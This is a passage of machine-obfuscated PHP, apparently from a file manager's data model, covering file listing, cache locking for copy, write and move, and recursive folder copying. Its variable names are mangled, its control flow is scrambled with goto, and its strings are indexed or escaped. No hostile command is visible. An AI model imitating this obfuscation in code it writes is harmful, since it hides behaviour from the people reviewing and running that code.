Model($CĞŠòğÙ[460])->getInfoSimple($Fåë¨Ğöó™[$CĞŠòğÙ[458]]); $dóäá„ù®ñ = $F‚½­´ÁŠÀ[$CĞŠòğÙ[28]]; } else { if ($Fåë¨Ğöó™[$CĞŠòğÙ[371]] == self::TYPE_SYSTEM) { $F‚½­´ÁŠÀ = $this->sourceInfo($cÊ¥ÒõéÔ¾[0], !0); $dóäá„ù®ñ = $F‚½­´ÁŠÀ[$CĞŠòğÙ[28]]; } } } $dóäá„ù®ñ = $dóäá„ù®ñ ? $CĞŠòğÙ[8] . $dóäá„ù®ñ . $CĞŠòğÙ[8] : $CĞŠòğÙ[8]; return $dóäá„ù®ñ; } protected function _listAppendUser(&$CÖÈˆ¼‹Å¬) { goto CŠ†…²ˆš; CŠ†…²ˆš: $bœÅ›îõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bùŠ²á²Ì¦ = array_to_keyvalue($CÖÈˆ¼‹Å¬, $bœÅ›îõ[33], $bœÅ›îõ[378]); $dòçàÛ Š’ = array_to_keyvalue($CÖÈˆ¼‹Å¬, $bœÅ›îõ[33], $bœÅ›îõ[379]); goto d‰‚‡˜Ù—; EÚ¥·ÃÛŒî: unset($CÉ¤ğàß”µ); goto d‘ƒ‹à´; d‰‚‡˜Ù—: $eÃŸ—ƒßÔ = array_merge($bùŠ²á²Ì¦, $dòçàÛ Š’); $a„ŞÌ²È…Ï = Model($bœÅ›îõ[479])->userListInfo($eÃŸ—ƒßÔ); foreach ($CÖÈˆ¼‹Å¬ as &$CÉ¤ğàß”µ) { $BÕØ¥Ì‹Á† = $CÉ¤ğàß”µ[$bœÅ›îõ[378]]; $CÉ¤ğàß”µ[$bœÅ›îõ[378]] = $a„ŞÌ²È…Ï[$BÕØ¥Ì‹Á†] ? $a„ŞÌ²È…Ï[$BÕØ¥Ì‹Á†] : !1; $BÕØ¥Ì‹Á† = $CÉ¤ğàß”µ[$bœÅ›îõ[379]]; $CÉ¤ğàß”µ[$bœÅ›îõ[379]] = $a„ŞÌ²È…Ï[$BÕØ¥Ì‹Á†] ? $a„ŞÌ²È…Ï[$BÕØ¥Ì‹Á†] : !1; if (isset($CÉ¤ğàß”µ[$bœÅ›îõ[417]]) && $CÉ¤ğàß”µ[$bœÅ›îõ[417]][$bœÅ›îõ[480]]) { $bİĞ‘–ˆ° = $GLOBALS[$bœÅ›îõ[6]][$bœÅ›îõ[84]][$bœÅ›îõ[481]]; if ($CÉ¤ğàß”µ[$bœÅ›îõ[417]][$bœÅ›îõ[482]] <= time() - $bİĞ‘–ˆ°) { $this->metaSet($CÉ¤ğàß”µ[$bœÅ›îõ[369]], $bœÅ›îõ[480], null); $this->metaSet($CÉ¤ğàß”µ[$bœÅ›îõ[369]], $bœÅ›îõ[482], null); unset($CÉ¤ğàß”µ[$bœÅ›îõ[417]][$bœÅ›îõ[480]]); continue; } $EÒ¬¾‚Ëàí = $CÉ¤ğàß”µ[$bœÅ›îõ[417]][$bœÅ›îõ[480]]; $CÉ¤ğàß”µ[$bœÅ›îõ[417]][$bœÅ›îõ[483]] = Model($bœÅ›îõ[479])->getInfoSimpleOuter($EÒ¬¾‚Ëàí); } } goto EÚ¥·ÃÛŒî; d‘ƒ‹à´: } public function parentLevelArray($aµÏ„Î¤¦) { $B‘Ëá‰ç¼ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aµÏ„Î¤¦ = explode($B‘Ëá‰ç¼[47], trim($aµÏ„Î¤¦, $B‘Ëá‰ç¼[47])); return array_remove_value($aµÏ„Î¤¦, $B‘Ëá‰ç¼[470]); } public function listAll($cÑ¬©ÈÅ×é) { goto b™×ñˆ¯°; a¸ö˜Ñß»¾: $eê‚æÖ»¡† = array(); foreach ($f¸Ìµ¬ˆÏ© as $bŠ¯¢õ¥ß => $Bã­½µ£Çš) { goto F¹Ñß—ƒßµ; bùœÍ‹·Œ: if (!$Bã­½µ£Çš[$b“äºÇ†”²[370]]) { $côñ¥í—[$b“äºÇ†”²[419]] = $Bã­½µ£Çš[$b“äºÇ†”²[419]]; $côñ¥í—[$b“äºÇ†”²[491]] = $Bã­½µ£Çš[$b“äºÇ†”²[75]]; } $eê‚æÖ»¡†[] = $côñ¥í—; goto dó´ÕõÌ®; F¹Ñß—ƒßµ: $a×Ş³©¸Ë² = $this->parentLevelArray($Bã­½µ£Çš[$b“äºÇ†”²[461]]); array_shift($a×Ş³©¸Ë²); $AáöÍÊ£„Š = $CÎì†¶÷”; goto fÏ…ÒİÁ­–; fÏ…ÒİÁ­–: for ($d’œÔâó×§ = 0; $d’œÔâó×§ < count($a×Ş³©¸Ë²); $d’œÔâó×§++) { $AáöÍÊ£„Š .= $f¸Ìµ¬ˆÏ©[$a×Ş³©¸Ë²[$d’œÔâó×§]][$b“äºÇ†”²[28]] . $b“äºÇ†”²[8]; } $AáöÍÊ£„Š .= $Bã­½µ£Çš[$b“äºÇ†”²[28]]; if ($Bã­½µ£Çš[$b“äºÇ†”²[370]]) { $AáöÍÊ£„Š .= $b“äºÇ†”²[8]; } goto bèöÁÆŞ‚ï; bèöÁÆŞ‚ï: $AáöÍÊ£„Š = str_replace($b“äºÇ†”²[469], $b“äºÇ†”²[8], $AáöÍÊ£„Š); $AáöÍÊ£„Š = str_replace($b“äºÇ†”²[469], $b“äºÇ†”²[8], $AáöÍÊ£„Š); $côñ¥í— = array($b“äºÇ†”²[387] => str_replace($b“äºÇ†”²[469], $b“äºÇ†”²[8], $AáöÍÊ£„Š), $b“äºÇ†”²[490] => intval($Bã­½µ£Çš[$b“äºÇ†”²[370]]), $b“äºÇ†”²[391] => $this->pathInfoFilter($Bã­½µ£Çš, !0)); goto bùœÍ‹·Œ; dó´ÕõÌ®: } return $eê‚æÖ»¡†; goto e¢ËË‹ñÖ; b™×ñˆ¯°: $b“äºÇ†”² =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÍŸ‹™šëÇ = $this->sourceInfo($cÑ¬©ÈÅ×é); $f¡ğ‹Š×Šô = array($b“äºÇ†”²[484] => array($b“äºÇ†”²[485], $CÍŸ‹™šëÇ[$b“äºÇ†”²[461]] . $cÑ¬©ÈÅ×é . $b“äºÇ†”²[486]), $b“äºÇ†”²[487] => 0); goto e•ŸëƒŸŠ›; Fì¥àÀË»: $f¸Ìµ¬ˆÏ© = array_to_keyvalue($f¸Ìµ¬ˆÏ©, $b“äºÇ†”²[369]); $CÎì†¶÷” = "\57{$CÍŸ‹™šëÇ[$b“äºÇ†”²[28]]}\57"; $CÎì†¶÷” = $CÎì†¶÷” == $b“äºÇ†”²[469] ? $b“äºÇ†”²[8] : $CÎì†¶÷”; goto a¸ö˜Ñß»¾; e•ŸëƒŸŠ›: $f¢»Áäöä« = $b“äºÇ†”²[488]; $aÙáŞÒÃ© = "\x4c\105\106\x54\x20\x4a\x4f\x49\116\40{$this->tablePrefix}\151\157\137\x66\x69\x6c\145\x20\146\x69\x6c\145\40\x6f\156\40\x73\x6f\x75\x72\x63\145\56\146\151\154\x65\111\x44\40\75\40\146\x69\154\145\56\x66\151\x6c\x65\x49\x44"; $f¸Ìµ¬ˆÏ© = $this->alias($b“äºÇ†”²[489])->field($f¢»Áäöä«)->where($f¡ğ‹Š×Šô)->join($aÙáŞÒÃ©)->select(); goto E©Âí‰›; E©Âí‰›: $this->_listAppendAuth($f¸Ìµ¬ˆÏ©); $this->_listAppendUser($f¸Ìµ¬ˆÏ©); $this->_listAppendPath($f¸Ìµ¬ˆÏ©); goto Fì¥àÀË»; e¢ËË‹ñÖ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($eèñİÁ‘ºº) { goto cÚ°ÖÍÂö; d†„Ñ¿‹Ğ¬: $B´î´çÇƒõ = 1; $this->_lockEvent($eèñİÁ‘ºº, array($D´«øÜ£ª[493], $D´«øÜ£ª[494]), $B´î´çÇƒõ); $this->_lockParent($eèñİÁ‘ºº, array($D´«øÜ£ª[494]), $B´î´çÇƒõ); goto Dñ¸ ß´®; Dñ¸ ß´®: $this->_lockEvent($eèñİÁ‘ºº, array($D´«øÜ£ª[495], $D´«øÜ£ª[496]), $B´î´çÇƒõ); $this->_lockCheckEnd($D´«øÜ£ª[492], $eèñİÁ‘ºº); goto E“ê­Ã¿ß; cÚ°ÖÍÂö: $D´«øÜ£ª =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($D´«øÜ£ª[492], $eèñİÁ‘ºº); goto d†„Ñ¿‹Ğ¬; E“ê­Ã¿ß: } public function lockCopyEnd($Eø¶ÊĞÍ´ì) { $B©ùÃµíÉ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->allowLock()) { return; } $b˜¤î•ïîß = 0; $this->_lockEvent($Eø¶ÊĞÍ´ì, array($B©ùÃµíÉ[493], $B©ùÃµíÉ[494]), $b˜¤î•ïîß); $this->_lockParent($Eø¶ÊĞÍ´ì, array($B©ùÃµíÉ[494]), $b˜¤î•ïîß); $this->_lockEvent($Eø¶ÊĞÍ´ì, array($B©ùÃµíÉ[495], $B©ùÃµíÉ[496]), $b˜¤î•ïîß); } public function lockWriteStart($E’°„ÅÌè², $A¿‰œâ¤’„ = '') { goto b”¢ƒ‰ô´º; eº¨÷ØÆ×: $this->_lockParent($E’°„ÅÌè², array($AµáÚâë…ï[492], $AµáÚâë…ï[494]), $fîáƒÄ£Ç¨); $this->_lockCheckEnd($AµáÚâë…ï[493], $E’°„ÅÌè²); goto c›ùó‰¬; eˆ¼ª“æƒÄ: $fîáƒÄ£Ç¨ = 1; $this->_lockKey($AµáÚâë…ï[497] . $E’°„ÅÌè² . $AµáÚâë…ï[91] . $A¿‰œâ¤’„, $fîáƒÄ£Ç¨); $this->_lockEvent($E’°„ÅÌè², array($AµáÚâë…ï[492], $AµáÚâë…ï[494]), $fîáƒÄ£Ç¨); goto eº¨÷ØÆ×; b”¢ƒ‰ô´º: $AµáÚâë…ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($AµáÚâë…ï[493], $E’°„ÅÌè²); goto eˆ¼ª“æƒÄ; c›ùó‰¬: } public function lockWriteEnd($e™ŠË‰Ÿ¯é, $dïåò…ÂÅ‡ = '') { $bô¦ˆ­Ğ¶¿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->allowLock()) { return; } $bÕÔÓôïÚ‡ = 0; $this->_lockKey($bô¦ˆ­Ğ¶¿[497] . $e™ŠË‰Ÿ¯é . $bô¦ˆ­Ğ¶¿[91] . $dïåò…ÂÅ‡, $bÕÔÓôïÚ‡); $this->_lockEvent($e™ŠË‰Ÿ¯é, array($bô¦ˆ­Ğ¶¿[492], $bô¦ˆ­Ğ¶¿[494]), $bÕÔÓôïÚ‡); $this->_lockParent($e™ŠË‰Ÿ¯é, array($bô¦ˆ­Ğ¶¿[492], $bô¦ˆ­Ğ¶¿[494]), $bÕÔÓôïÚ‡); } public function lockMoveStart($dĞº—˜ã—) { goto e§è…»ºÙ; e§è…»ºÙ: $cï¢•ÀÙ’÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->allowLock()) { return; } $this->_lockCheck($cï¢•ÀÙ’÷[494], $dĞº—˜ã—); goto a¡ÕíÕç‚º; cš‹’†îè : $this->_lockParent($dĞº—˜ã—, array($cï¢•ÀÙ’÷[492], $cï¢•ÀÙ’÷[494]), $bÕ•¬ğà÷ˆ); $this->_lockEvent($dĞº—˜ã—, array($cï¢•ÀÙ’÷[499], $cï¢•ÀÙ’÷[495], $cï¢•ÀÙ’÷[496]), $bÕ•¬ğà÷ˆ); $this->_lockCheckEnd($cï¢•ÀÙ’÷[494], $dĞº—˜ã—); goto eŸÈ¡Í‹ÑŒ; a¡ÕíÕç‚º: $bÕ•¬ğà÷ˆ = 1; $this->_lockKey($cï¢•ÀÙ’÷[498] . $dĞº—˜ã—, $bÕ•¬ğà÷ˆ); $this->_lockEvent($dĞº—˜ã—, array($cï¢•ÀÙ’÷[492], $cï¢•ÀÙ’÷[493]), $bÕ•¬ğà÷ˆ); goto cš‹’†îè ; eŸÈ¡Í‹ÑŒ: } public function lockMoveEnd($FŞ¤Ôæ·‚ª) { goto Eé×¶ÌÖ¨; Fà‚àªÍ¦Ó: $this->_lockKey($d«ÁÚ†Ú³Æ[498] . $FŞ¤Ôæ·‚ª, $dÕ÷ä‚”çÅ); $this->_lockEvent($FŞ¤Ôæ·‚ª, array($d«ÁÚ†Ú³Æ[492], $d«ÁÚ†Ú³Æ[493]), $dÕ÷ä‚”çÅ); $this->_lockParent($FŞ¤Ôæ·‚ª, array($d«ÁÚ†Ú³Æ[492], $d«ÁÚ†Ú³Æ[494]), $dÕ÷ä‚”çÅ); goto cî‡¨ß¬Š; Eé×¶ÌÖ¨: $d«ÁÚ†Ú³Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->allowLock()) { return; } $dÕ÷ä‚”çÅ = 0; goto Fà‚àªÍ¦Ó; cî‡¨ß¬Š: $this->_lockEvent($FŞ¤Ôæ·‚ª, array($d«ÁÚ†Ú³Æ[499], $d«ÁÚ†Ú³Æ[495], $d«ÁÚ†Ú³Æ[496]), $dÕ÷ä‚”çÅ); goto EË¶„‚àÁ¯; EË¶„‚àÁ¯: } private function _lockCheck($Eê¾Ü¸Å¨, $A¾ãŠ©²‚) { goto Déö ëµøÊ; fÁÈÊ¼†Ãî: $D¡‰±×÷¾» = array_reverse($this->parentLevelArray($a©¼‹ÎòØ‡[$E”åÄ‹ñ[461]])); foreach ($D¡‰±×÷¾» as $eéç¨ÈÙ¥İ) { $FëÂ„‰Úæù = $Eê¾Ü¸Å¨ . $E”åÄ‹ñ[501] . $eéç¨ÈÙ¥İ; if (CacheLock::lockGet($E”åÄ‹ñ[502] . $FëÂ„‰Úæù)) { $a©¼‹ÎòØ‡ = $this->sourceInfo($eéç¨ÈÙ¥İ); CacheLock::setErrorMsg($E”åÄ‹ñ[157] . htmlspecialchars($a©¼‹ÎòØ‡[$E”åÄ‹ñ[28]]) . $E”åÄ‹ñ[478] . $b»ªŞ¥Ãö); $this->_lockKey($FëÂ„‰Úæù, 1); $this->_lockKey($FëÂ„‰Úæù, 0); } } goto D„¹ëšˆè©; d„ƒç‹ìñµ: CacheLock::setErrorMsg($E”åÄ‹ñ[157] . htmlspecialchars($a©¼‹ÎòØ‡[$E”åÄ‹ñ[28]]) . $E”åÄ‹ñ[478] . $b»ªŞ¥Ãö); $this->_lockKey($FëÂ„‰Úæù, 1); $this->_lockKey($FëÂ„‰Úæù, 0); goto fÁÈÊ¼†Ãî; Déö ëµøÊ: $E”åÄ‹ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a©¼‹ÎòØ‡ = $this->sourceInfo($A¾ãŠ©²‚); $FëÂ„‰Úæù = $Eê¾Ü¸Å¨ . $E”åÄ‹ñ[91] . $A¾ãŠ©²‚; goto AÎ¦×ÆÄ…ğ; AÎ¦×ÆÄ…ğ: $this->_lockTimeStart[$FëÂ„‰Úæù] = timeFloat(); if (!is_array($a©¼‹ÎòØ‡)) { return; } $b»ªŞ¥Ãö = LNG($E”åÄ‹ñ[500]); goto d„ƒç‹ìñµ; D„¹ëšˆè©: } private function _lockCheckEnd($eÓéê™Ù·, $F‰•ß…ŒË‘) { goto F…‡í‰´­÷; F…‡í‰´­÷: $Dª™Â×ŒÒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÀÆÇ‡‰óê = $eÓéê™Ù· . $Dª™Â×ŒÒ[91] . $F‰•ß…ŒË‘; CacheLock::setErrorMsg($Dª™Â×ŒÒ[361]); goto Dà´áÔØòŠ; Dà´áÔØòŠ: if (!isset($this->_lockTimeStart[$EÀÆÇ‡‰óê])) { return; } $dÇ™¢Ğº­ = timeFloat() - $this->_lockTimeStart[$EÀÆÇ‡‰óê]; unset($this->_lockTimeStart[$EÀÆÇ‡‰óê]); goto E‚â­–”ë½; E‚â­–”ë½: if ($dÇ™¢Ğº­ > 0.5) { unset(self::$cacheSourceInfo[$Dª™Â×ŒÒ[410] . $F‰•ß…ŒË‘]); } $f¡ç¥­ÅÏ = $this->sourceInfo($F‰•ß…ŒË‘); if (!$f¡ç¥­ÅÏ) { show_json(LNG($Dª™Â×ŒÒ[101]), !1); } goto AË ôÅô‚Ñ; AË ôÅô‚Ñ: } private function _lockParent($Bë£öœÌ, $ağíÔËŠñ, $A¥»¸°Œ‡‹) { if (!$this->autoLockSet) { return; } $Dù÷½öÄ³ = $this->sourceInfo($Bë£öœÌ); if (!is_array($Dù÷½öÄ³)) { return; } $Eß§Ìƒø‘Š = array_reverse($this->parentLevelArray($Dù÷½öÄ³[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][461]])); foreach ($Eß§Ìƒø‘Š as $dÄ•òµŠš) { $this->_lockEvent($dÄ•òµŠš, $ağíÔËŠñ, $A¥»¸°Œ‡‹); } } private function _lockEvent($f‘³È×”çŸ, $d©™ä™ ×º, $e•êÌ¶âÍŒ) { $Eï˜Ï®‡ÚŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->autoLockSet) { return; } foreach ($d©™ä™ ×º as $d†ğéÆ¹š) { $dìßÅ’ ‚¢ = $d†ğéÆ¹š . $Eï˜Ï®‡ÚŒ[91] . $f‘³È×”çŸ; if ($e•êÌ¶âÍŒ && CacheLock::lockGet($Eï˜Ï®‡ÚŒ[502] . $dìßÅ’ ‚¢)) { continue; } $this->_lockKey($dìßÅ’ ‚¢, $e•êÌ¶âÍŒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($bÕé„â«ğ, $b ÎÌÉÔÒë = 1) { $eã¿Òö«Õ· = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][502] . md5($bÕé„â«ğ); if ($b ÎÌÉÔÒë) { if (isset(self::$_lockItemArr[$eã¿Òö«Õ·])) { return; } self::$_lockItemArr[$eã¿Òö«Õ·] = 1; CacheLock::lock($eã¿Òö«Õ·, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$eã¿Òö«Õ·])) { return; } unset(self::$_lockItemArr[$eã¿Òö«Õ·]); CacheLock::unlock($eã¿Òö«Õ·); } } public function isParentOf($a ±ÉÜ¿ œ, $Fä“œ™ïËÌ) { goto E®½º³¶ÑÆ; E®Û£…µÜ: $aµ‚ÚÂŠ™ = $d®÷¢±„ñÅ[$b×Ûˆ”²ì[461]] . $d®÷¢±„ñÅ[$b×Ûˆ”²ì[369]] . $b×Ûˆ”²ì[47]; $bŞÄïòÒæ = $fåô»Ê« Ä[$b×Ûˆ”²ì[461]] . $fåô»Ê« Ä[$b×Ûˆ”²ì[369]] . $b×Ûˆ”²ì[47]; $cÅí°á¯ÂÚ = strpos($bŞÄïòÒæ, $aµ‚ÚÂŠ™) === 0; goto DÀ¤ß¥‘Âí; E®½º³¶ÑÆ: $b×Ûˆ”²ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d®÷¢±„ñÅ = $this->sourceInfo($a ±ÉÜ¿ œ); $fåô»Ê« Ä = $this->sourceInfo($Fä“œ™ïËÌ); goto E®Û£…µÜ; DÀ¤ß¥‘Âí: return $cÅí°á¯ÂÚ; goto e‡±¦‰‚‘Ê; e‡±¦‰‚‘Ê: } private $targetIsDelete = 0; public function copy($E¨Ş®Ê½·¨, $e¢³Ì‰¢Ùœ, $EØŠ›¸Ê†ã = REPEAT_REPLACE, $BĞ¥ôîÛïÌ = '') { goto a¿µ³ç…á«; EÀ²ö‡óßô: $this->_childrenListClear(); $this->lockCopyEnd($E¨Ş®Ê½·¨); $this->lockWriteEnd($e¢³Ì‰¢Ùœ, $C‡—Ëéõ¿µ); goto cª¢í”ÜÏ¸; C†¯Ï¡ó: if (!$aãè‘ˆ³æÃ || !$E¸²Äº¾ || $E¸²Äº¾[$AÄ™›Ê‘Ø[370]] != $AÄ™›Ê‘Ø[83]) { return !1; } if ($this->isParentOf($E¨Ş®Ê½·¨, $e¢³Ì‰¢Ùœ)) { return !1; } $C‡—Ëéõ¿µ = $BĞ¥ôîÛïÌ ? $BĞ¥ôîÛïÌ : $aãè‘ˆ³æÃ[$AÄ™›Ê‘Ø[28]]; goto a…ÜÄÕÜ’…; EÉ‹ÅãìÁ: $this->targetIsDelete = intval($aãè‘ˆ³æÃ[$AÄ™›Ê‘Ø[397]]); $A²¶¯†ñ«ä = $this->fileNameExistCache($e¢³Ì‰¢Ùœ, $aãè‘ˆ³æÃ[$AÄ™›Ê‘Ø[28]]); $A©“ÙÆºÊö = $this->_copy($E¨Ş®Ê½·¨, $e¢³Ì‰¢Ùœ, $EØŠ›¸Ê†ã, $Aˆ™‚îïÀ, !0, $BĞ¥ôîÛïÌ); goto EÀ²ö‡óßô; a…ÜÄÕÜ’…: $this->lockCopyStart($E¨Ş®Ê½·¨); $this->lockWriteStart($e¢³Ì‰¢Ùœ, $C‡—Ëéõ¿µ); $Aˆ™‚îïÀ = array($AÄ™›Ê‘Ø[503] => array(), $AÄ™›Ê‘Ø[504] => array(), $AÄ™›Ê‘Ø[505] => array()); goto EÉ‹ÅãìÁ; Eäİˆ é×…: $this->updateModifyTime($e¢³Ì‰¢Ùœ); return $A©“ÙÆºÊö; goto CŒíÒå¿; C¡¾±ìÕˆÊ: $this->saveAll($Aˆ™‚îïÀ[$AÄ™›Ê‘Ø[505]]); Model($AÄ™›Ê‘Ø[167])->linkAdd($Aˆ™‚îïÀ[$AÄ™›Ê‘Ø[503]]); $this->folderSizeReset($e¢³Ì‰¢Ùœ); goto Eäİˆ é×…; cª¢í”ÜÏ¸: if ($aãè‘ˆ³æÃ[$AÄ™›Ê‘Ø[370]] == $AÄ™›Ê‘Ø[83] && $A²¶¯†ñ«ä == $A©“ÙÆºÊö) { $this->folderSizeResetChildren($A²¶¯†ñ«ä); } Model($AÄ™›Ê‘Ø[506])->addAll($Aˆ™‚îïÀ[$AÄ™›Ê‘Ø[504]], array(), !0); if ($A²¶¯†ñ«ä != $A©“ÙÆºÊö || $aãè‘ˆ³æÃ[$AÄ™›Ê‘Ø[370]] == $AÄ™›Ê‘Ø[83]) { Model($AÄ™›Ê‘Ø[507])->eventCopy($A©“ÙÆºÊö); } goto C¡¾±ìÕˆÊ; a¿µ³ç…á«: $AÄ™›Ê‘Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aãè‘ˆ³æÃ = $this->sourceInfo($E¨Ş®Ê½·¨); $E¸²Äº¾ = $this->sourceInfo($e¢³Ì‰¢Ùœ); goto C†¯Ï¡ó; CŒíÒå¿: } private function _copy($D”ÒùŸøÉ, $fÓ´‰¦ÑÏß, $Fß«ªÏ£Òé, &$AõŠ‡ªî®, $eñ†’ĞŸÎÜ, $B·´×½ä‘å = '') { goto d½‡¼µÕÎä; d½‡¼µÕÎä: $eìÛÔÔ„Ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dÃĞ•Éµ‘ = $this->sourceInfoCache($D”ÒùŸøÉ); $dˆåƒíÀª“ = $dÃĞ•Éµ‘[$eìÛÔÔ„Ã[370]] == $eìÛÔÔ„Ã[83]; goto AÀ©â§…Š; eİß‹‹˜É¦: if (!$Bí’œ„¾±Â) { return $this->_copyCreate($D”ÒùŸøÉ, $fÓ´‰¦ÑÏß, $AÆË­ß¬Àá, $AõŠ‡ªî®); } $c‰Õ‚ ‚Ë = $Bí’œ„¾±Â; if ($dˆåƒíÀª“) { if ($Fß«ªÏ£Òé == REPEAT_RENAME_FOLDER) { $AÆË­ß¬Àá = $this->fileNameAutoCache($fÓ´‰¦ÑÏß, $AÆË­ß¬Àá, $Fß«ªÏ£Òé, $dˆåƒíÀª“); $c‰Õ‚ ‚Ë = $this->_copyCreate($D”ÒùŸøÉ, $fÓ´‰¦ÑÏß, $AÆË­ß¬Àá, $AõŠ‡ªî®); } else { $e™¡ŞÔ„„Ÿ = $this->_childrenList($D”ÒùŸøÉ); foreach ($e™¡ŞÔ„„Ÿ as $dçÏà±ÎŒ) { $this->_copy($dçÏà±ÎŒ[$eìÛÔÔ„Ã[369]], $Bí’œ„¾±Â, $Fß«ªÏ£Òé, $AõŠ‡ªî®, !1); } } } else { if ($Fß«ªÏ£Òé == REPEAT_RENAME || $Fß«ªÏ£Òé == REPEAT_RENAME_FOLDER) { $AÆË­ß¬Àá = $this->fileNameAutoCache($fÓ´‰¦ÑÏß, $AÆË­ß¬Àá, $Fß«ªÏ£Òé, $dˆåƒíÀª“); $c‰Õ‚ ‚Ë = $this->_copyCreate($D”ÒùŸøÉ, $fÓ´‰¦ÑÏß, $AÆË­ß¬Àá, $AõŠ‡ªî®); } else { if ($Fß«ªÏ£Òé == REPEAT_REPLACE) { $C¯ÑÒÄÏ¹ = $this->sourceInfoCache($Bí’œ„¾±Â); $Dé×¼½ñÃ = $this->fileHistory($C¯ÑÒÄÏ¹, $dÃĞ•Éµ‘[$eìÛÔÔ„Ã[419]], $dÃĞ•Éµ‘[$eìÛÔÔ„Ã[77]]); if ($Dé×¼½ñÃ) { $AõŠ‡ªî®[$eìÛÔÔ„Ã[503]][] = $dÃĞ•Éµ‘[$eìÛÔÔ„Ã[419]]; } } else { if ($Fß«ªÏ£Òé == REPEAT_SKIP) { } } } Hook::trigger($eìÛÔÔ„Ã[508], array($eìÛÔÔ„Ã[509], $dÃĞ•Éµ‘, 0)); } goto B­®ÔÒÛíš; B­®ÔÒÛíš: return $c‰Õ‚ ‚Ë; goto DïãĞñ½Ü; AÀ©â§…Š: $AÆË­ß¬Àá = $B·´×½ä‘å ? $B·´×½ä‘å : $dÃĞ•Éµ‘[$eìÛÔÔ„Ã[28]]; $Bí’œ„¾±Â = $this->fileNameExistCache($fÓ´‰¦ÑÏß, $AÆË­ß¬Àá); if ($eñ†’ĞŸÎÜ) { $this->_childrenAllMake($D”ÒùŸøÉ); if ($dˆåƒíÀª“ && $Bí’œ„¾±Â) { $this->_childrenAllMake($Bí’œ„¾±Â); } } goto eİß‹‹˜É¦; DïãĞñ½Ü: } private function _copyCreate($eîÓñ§‹Â¼, $dª¿¨Ó¢÷½, $e×Ë‚Û–æ…, &$bÒ×é¥Ìö‰) { goto AÎ«ÂË·÷; B¿ëÖÏğæ: $eÄŒß³×Á¸[$eîÓñ§‹Â¼] = $CÊÆÛÍË§‡; $F™ºòÊ”›‹ = array(); $Dâ„´½ÂßŒ = array(); goto dÇ¥Æ©è³™; c—êÚñ¾¼è: $this->_childrenListAll($eîÓñ§‹Â¼, $a™šÆºœ×); $eâªĞØ²ì— = count($a™šÆºœ×); if ($eâªĞØ²ì— == 0) { return $CÊÆÛÍË§‡; } goto dÕ«‹ì ğ×; c—¥ÖŠ‡“È: $this->addAll($c‹Ÿ¨£›—, array(), !1); $d½¯†ßİÑ = $this->where(array($Bê¹Â÷êê[463] => $CÊÆÛÍË§‡))->select(); $eÄŒß³×Á¸ = $this->_childrenMakeRelation($a™šÆºœ×, $d½¯†ßİÑ); goto B¿ëÖÏğæ; BÅªŒ¬µ¨Ù: $CÊÆÛÍË§‡ = $this->add($B¬†Ù¤±ˆ); $c±††Ã°¡ = array($Bê¹Â÷êê[369] => $CÊÆÛÍË§‡, $Bê¹Â÷êê[28] => $e×Ë‚Û–æ…); $this->_copyApplyMeta($c±††Ã°¡, $bÒ×é¥Ìö‰); goto D¦µÅšÃÉ´; E¬óâ‹Ê—ì: $this->chunkEventSet($Bê¹Â÷êê[517], array($Bê¹Â÷êê[518], $B¬†Ù¤±ˆ, $eâªĞØ²ì—)); $this->saveAll($Dâ„´½ÂßŒ); return $CÊÆÛÍË§‡; goto eÁÇ…µ­¨’; dÇ¥Æ©è³™: foreach ($d½¯†ßİÑ as $dà§´ùö³‡) { $b¯¼ïÍ¤÷İ = $dà§´ùö³‡[$Bê¹Â÷êê[369]]; $cº®Š¦è‰å = $this->_childrenMatch($eÄŒß³×Á¸, $dà§´ùö³‡, $CêÇøŸ‰ù£); $F™ºòÊ”›‹[] = array($Bê¹Â÷êê[369], $b¯¼ïÍ¤÷İ, $Bê¹Â÷êê[463], $cº®Š¦è‰å[$Bê¹Â÷êê[463]]); $Dâ„´½ÂßŒ[] = array($Bê¹Â÷êê[369], $b¯¼ïÍ¤÷İ, $Bê¹Â÷êê[461], $cº®Š¦è‰å[$Bê¹Â÷êê[461]]); $this->_copyApplyMeta($dà§´ùö³‡, $bÒ×é¥Ìö‰); if ($dà§´ùö³‡[$Bê¹Â÷êê[370]] != $Bê¹Â÷êê[83]) { $bÒ×é¥Ìö‰[$Bê¹Â÷êê[503]][] = $dà§´ùö³‡[$Bê¹Â÷êê[419]]; } } $this->chunkEventSet($Bê¹Â÷êê[515], array($Bê¹Â÷êê[516], $B¬†Ù¤±ˆ, $eâªĞØ²ì—)); $this->saveAll($F™ºòÊ”›‹); goto E¬óâ‹Ê—ì; D¦µÅšÃÉ´: if ($d”ãŞèá[$Bê¹Â÷êê[370]] != $Bê¹Â÷êê[83]) { $bÒ×é¥Ìö‰[$Bê¹Â÷êê[503]][] = $d”ãŞèá[$Bê¹Â÷êê[419]]; return $CÊÆÛÍË§‡; } $a™šÆºœ× = array(); $c‹Ÿ¨£›— = array(); goto c—êÚñ¾¼è; c¥ç²Ë”®¥: $B¬†Ù¤±ˆ = $this->_makeItemData($d”ãŞèá, $A…ç¤ÀŒÛ¨, $e×Ë‚Û–æ…); Hook::trigger($Bê¹Â÷êê[510], $B¬†Ù¤±ˆ); Hook::trigger($Bê¹Â÷êê[511], 